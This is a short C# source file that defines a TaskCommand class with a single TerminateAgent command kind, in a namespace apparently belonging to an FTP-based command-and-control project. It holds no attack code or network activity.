using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FtpC2.Tasks
{   
    internal class TaskCommand : TaskWrapper
    {
        public enum CommandKind
        {
            TerminateAgent,            
        }

        public CommandKind Command { get; set; }
    }
}
